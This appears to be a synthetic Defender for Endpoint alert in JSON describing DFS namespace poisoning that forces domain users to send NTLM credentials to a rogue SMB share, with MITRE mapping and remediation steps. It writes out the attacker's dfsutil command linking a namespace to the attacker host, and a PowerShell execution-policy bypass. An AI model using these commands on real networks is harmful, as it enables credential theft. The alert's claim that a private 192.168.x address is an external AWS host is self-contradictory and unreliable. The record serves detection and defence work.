{
  "vendor": "Microsoft",
  "product": "Microsoft Defender for Endpoint",
  "severity": "High",
  "category": "Credential Access",
  "alert_name": "Distributed File System Namespace Management Abuse for Forced Authentication",
  "description": "Suspicious abuse of Distributed File System Namespace Management (DFSNM) protocol detected on file server FS-PROD-01 (10.10.20.50) at 2024-11-10 14:32:45 UTC. The attacker leveraged dfsutil.exe to create malicious DFS namespace link pointing to attacker-controlled SMB share at 192.168.100.200. When domain users DC-ADMIN\\helpdesk and DC-ADMIN\\backupuser accessed the poisoned namespace 'Documents' at 14:35 UTC, their Windows clients automatically sent NTLM authentication credentials to the rogue SMB server. Network traffic analysis shows NTLMv2 challenge-response hashes captured via SMB relay attack. The attacker executed command 'dfsutil.exe /root:\\\\DC-ADMIN\\Documents /add:\\\\192.168.100.200\\capture' from compromised service account svc_fileserver@dc-admin.local. The rogue server at 192.168.100.200 (outside corporate network, traced to EC2 instance in AWS eu-west-1) collected 17 unique NTLM hashes including Domain Admin credentials. Subsequent brute-force attempts observed from same IP targeting captured accounts. The DFSNM abuse bypasses traditional network security controls as DFS is trusted protocol. Investigation reveals svc_fileserver account compromised 48 hours earlier via Kerberoasting attack.",
  "host_name": "FS-PROD-01",
  "host_ip": [
    168432690
  ],
  "host_os": "AGENT_OS_WINDOWS",
  "user_name": [
    "svc_fileserver@dc-admin.local",
    "helpdesk@dc-admin.local",
    "backupuser@dc-admin.local"
  ],
  "account_id": "S-1-5-21-9876543210-1234567890-0987654321-5612",
  "domain": "dc-admin.local",
  "cgo_name": [
    "dfsutil.exe"
  ],
  "cgo_cmd": [
    "dfsutil.exe /root:\\\\DC-ADMIN\\Documents /add:\\\\192.168.100.200\\capture"
  ],
  "cgo_path": [
    "C:\\Windows\\System32\\dfsutil.exe"
  ],
  "cgo_pid": [
    4521
  ],
  "os_parent_name": [
    "powershell.exe"
  ],
  "os_parent_cmd": [
    "powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\setup_dfs.ps1"
  ],
  "os_parent_pid": [
    3890
  ],
  "threat_name": "DFSNM Abuse - Forced Authentication",
  "attack_mode": "Credential Access via DFS Namespace Poisoning",
  "verdict": "Malicious",
  "risk_score": "92",
  "risk_rating": "Critical",
  "host_risk_level": "Critical",
  "policy_type": "Network Security",
  "policy_description": "DFS namespace manipulation for credential theft via forced authentication",
  "policy_severity": "Critical",
  "policy_recommendation": "Remove malicious DFS namespace link immediately, block IP 192.168.100.200 at firewall, force password reset for 17 affected accounts (priority: Domain Admin), disable svc_fileserver account, enable SMB signing on all domain systems, implement DFS namespace change monitoring, investigate AWS EC2 instance, review Kerberoasting indicators",
  "log_source": "Windows Security Event Log",
  "event_id": "4688",
  "external_link": "https://attack.mitre.org/techniques/T1187/",
  "mitre_att&ck_tactic": "TA0006 - Credential Access",
  "mitre_att&ck_technique": "T1187 - Forced Authentication"
}